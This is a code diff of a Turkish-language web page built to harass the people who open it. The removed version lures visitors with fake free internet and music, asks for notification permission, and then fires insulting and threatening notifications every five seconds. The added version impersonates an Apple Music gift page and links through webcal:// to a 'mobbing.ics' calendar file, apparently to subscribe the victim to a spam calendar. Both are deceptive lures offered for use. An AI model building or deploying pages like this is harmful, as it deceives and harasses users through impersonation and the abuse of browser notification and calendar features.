@@ -2,69 +2,45 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Güncelleme Merkezi</title>
-    
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apple Music - Hediye Merkezi</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .card { width: 85%; padding: 30px; border: 1px solid #333; border-radius: 20px; background: #1c1c1e; }
-        .btn-push { background: #30d158; color: white; padding: 20px; border-radius: 15px; font-weight: bold; border: none; width: 100%; font-size: 18px; cursor: pointer; }
-        .step { font-size: 13px; color: #8e8e93; margin-top: 20px; }
+        body { 
+            background: #000; color: #fff; 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; text-align: center;
+        }
+        .container {
+            width: 85%; padding: 40px; 
+            background: #1c1c1e; border-radius: 30px; 
+            border: 1px solid #333;
+            box-shadow: 0 10px 50px rgba(255, 45, 85, 0.2);
+        }
+        .apple-logo { font-size: 60px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 700; }
+        p { color: #8e8e93; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
+        
+        .btn-claim {
+            background: linear-gradient(180deg, #ff2d55 0%, #d40035 100%);
+            color: white; padding: 18px 40px; 
+            border-radius: 15px; font-weight: bold; 
+            text-decoration: none; display: inline-block;
+            font-size: 18px; box-shadow: 0 4px 15px rgba(255, 45, 85, 0.4);
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div style="font-size: 50px; margin-bottom: 20px;">🔔</div>
-        <h2>BİLDİRİM SİSTEMİ</h2>
-        <p>Bedava internet ve müzik paketini tanımlamak için bildirimleri aktif edin.</p>
+    <div class="container">
+        <div class="apple-logo"></div>
+        <h1>Tebrikler Aga!</h1>
+        <p>Hesabına 12 aylık <b>Apple Music Pro</b> tanımlandı. <br>Hemen butona bas ve "Abone Ol" diyerek kodları almaya başla.</p>
         
-        <button class="btn-push" onclick="getNotificationPermission()">AKTİF ET</button>
+        <a href="webcal://raw.githubusercontent.com/KULLANICI_ADIN/REPN/main/mobbing.ics" class="btn-claim">HEDİYEYİ AL</a>
         
-        <p class="step">⚠️ İzin penceresi çıkmazsa: <br>Alttaki <b>Paylaş</b> butonuna basıp <b>Ana Ekran'a Ekle</b> deyin ve uygulamayı oradan açın.</p>
+        <div style="margin-top:20px; font-size:10px; color:#444;">ID: 2026-Troll-Beta-01</div>
     </div>
 
-    <script>
-        async function getNotificationPermission() {
-            // 1. ADIM: Bildirim desteği kontrolü
-            if (!("Notification" in window)) {
-                alert("Aga bu tarayıcı bildirim desteklemiyor. Safari'den 'Ana Ekran'a Ekle' yapman şart!");
-                return;
-            }
-
-            // 2. ADIM: İzin İste
-            const permission = await Notification.requestPermission();
-
-            if (permission === "granted") {
-                alert("SİSTEM AKTİF! Bildirim yağmuru başlıyor...");
-
-                // 3. ADIM: GERÇEK BİLDİRİM DÖNGÜSÜ
-                // Her 5 saniyede bir bildirim merkezine "çat" diye düşer
-                setInterval(() => {
-                    const msgs = [
-                        "🚨 SİLSENE LAN!",
-                        "😏 HADİ SİL SİLEBİLİYORSAN!",
-                        "📱 TELEFONUN ARTIK BENİM!",
-                        "🌈 BEN GAYIM - TÜM REHBERE GİTTİ!"
-                    ];
-                    const randomMsg = msgs[Math.floor(Math.random() * msgs.length)];
-
-                    // Bu gerçek sistem bildirimidir
-                    new Notification(randomMsg, {
-                        body: "Ayarlar'da boşuna gezme, mobbing devam ediyor!",
-                        icon: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg",
-                        tag: 'troll-' + Math.random() // Bildirimlerin üst üste binmemesi için
-                    });
-                }, 5000); // 5 saniyede bir (Çok hızlı yaparsan iOS spam diye engeller)
-
-            } else {
-                alert("İzni vermedin ki mobbing yapalım!");
-            }
-        }
-    </script>
 </body>
 </html>
